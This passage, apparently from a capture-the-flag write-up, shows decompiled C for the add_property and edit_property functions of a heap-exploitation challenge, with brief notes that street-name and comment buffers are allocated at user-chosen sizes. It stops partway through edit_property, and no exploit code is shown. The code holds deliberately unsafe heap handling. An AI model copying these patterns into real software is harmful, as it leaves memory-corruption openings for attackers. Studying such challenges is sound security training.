</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">add_property</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> lVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>pvVar2;
</span></span><span style="display:flex;"><span>  size_t sVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_21;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_20;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>_property;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_20 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  local_21 <span style="color:#555">=</span> <span style="color:#c30">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>  property <span style="color:#555">=</span> malloc(<span style="color:#f60">0x40</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (property <span style="color:#555">==</span> (<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Failed to allocate memory for the property&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    exit(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Enter the house number: &#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#555">&amp;</span>fmt_d,(<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x18</span>);
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;What is the length of the street name: &#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#555">&amp;</span>fmt_zu);
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  _property <span style="color:#555">=</span> property;
</span></span><span style="display:flex;"><span>  pvVar2 <span style="color:#555">=</span> malloc(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x28</span>) <span style="color:#555">+</span> <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)((<span style="color:#078;font-weight:bold">long</span>)_property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>) <span style="color:#555">=</span> pvVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Failed to allocate memory for the street name&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    exit(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Enter the street name: &#34;</span>);
</span></span><span style="display:flex;"><span>  fgets(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>),(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x28</span>),stdin);
</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>);
</span></span><span style="display:flex;"><span>  sVar3 <span style="color:#555">=</span> strcspn(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>),<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(undefined <span style="color:#555">*</span>)(sVar3 <span style="color:#555">+</span> lVar1) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;What is the price of the property?: &#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#555">&amp;</span>fmt_lf,(<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x10</span>);
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Would you like to add a comment for this property? [y/n]: &#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#555">&amp;</span>DAT_00102133,<span style="color:#555">&amp;</span>local_21);
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_21 <span style="color:#555">==</span> <span style="color:#c30">&#39;y&#39;</span>) {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;What is the length of the comment?: &#34;</span>);
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#555">&amp;</span>fmt_zu);
</span></span><span style="display:flex;"><span>    getchar();
</span></span><span style="display:flex;"><span>    _property <span style="color:#555">=</span> property;
</span></span><span style="display:flex;"><span>    pvVar2 <span style="color:#555">=</span> malloc(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x38</span>) <span style="color:#555">+</span> <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)((<span style="color:#078;font-weight:bold">long</span>)_property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">=</span> pvVar2;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;Failed to allocate memory for the comment&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>      exit(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Enter the comment: &#34;</span>);
</span></span><span style="display:flex;"><span>    fgets(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>),(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x38</span>),stdin);
</span></span><span style="display:flex;"><span>    lVar1 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>);
</span></span><span style="display:flex;"><span>    sVar3 <span style="color:#555">=</span> strcspn(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>)((<span style="color:#078;font-weight:bold">long</span>)property <span style="color:#555">+</span> <span style="color:#f60">0x30</span>),<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(undefined <span style="color:#555">*</span>)(sVar3 <span style="color:#555">+</span> lVar1) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_20 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so when we add a new property, important things that we do:</p>
<ul>
<li><code>malloc(0x40)</code> for <code>property</code> object</li>
<li>We can malloc street name with any size
<ul>
<li>And we store the given size inside the <code>property</code> object</li>
</ul>
</li>
<li>We can malloc comment with any size
<ul>
<li>And we store the given size inside the <code>property</code> object</li>
</ul>
</li>
</ul>
<h4 id="edit_property">edit_property <a href="#edit_property" class="anchor">#</a></h4>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">edit_property</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>pvVar1;
</span></span><span style="display:flex;"><span>  size_t sVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_29;
</span></span><span style="display:flex;"><span>  ulong input_size;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_20;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> _property;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_20 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  local_29 <span style="color:#555">=</span> <span style="color:#c30">&#39;n&#39;</span>;
</span></span><span style="display:flex;"><span>  input_size <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Would you like to change the house number? [y/n]: &#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#555">&amp;</span>DAT_00102133,<span style="color:#555">&amp;</span>local_29);
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_29 <span style="color:#555">==</span> <span style="color:#c30">&#39;y&#39;</span>) {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Enter the new house number: &#34;</span>);
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#555">&amp;</span>fmt_d,property <span style="color:#555">+</span> <span style="color:#f60">0x18</span>);
</span></span><span style="display:flex;"><span>    getchar();
</span></span><span style="display:flex;"><span>    local_29 <span style="color:#555">=</span> <span style="color:#c30">&#39;n&#39;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;Would you like to change the street? [y/n]: &#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#555">&amp;</span>DAT_00102133,<span style="color:#555">&amp;</span>local_29);
</span></span><span style="display:flex;"><span>  getchar();
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_29 <span style="color:#555">==</span> <span style="color:#c30">&#39;y&#39;</span>) {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Enter the new street name length: &#34;</span>);
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#555">&amp;</span>fmt_zu);
</span></span><span style="display:flex;"><span>    getchar();
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x28</span>) <span style="color:#555">&lt;</span> input_size) {
</span></span><span style="display:flex;"><span>      free(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>));
</span></span><span style="display:flex;"><span>      _property <span style="color:#555">=</span> property;
</span></span><span style="display:flex;"><span>      pvVar1 <span style="color:#555">=</span> malloc(input_size <span style="color:#555">+</span> <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(_property <span style="color:#555">+</span> <span style="color:#f60">0x20</span>) <span style="color:#555">=</span> pvVar1;
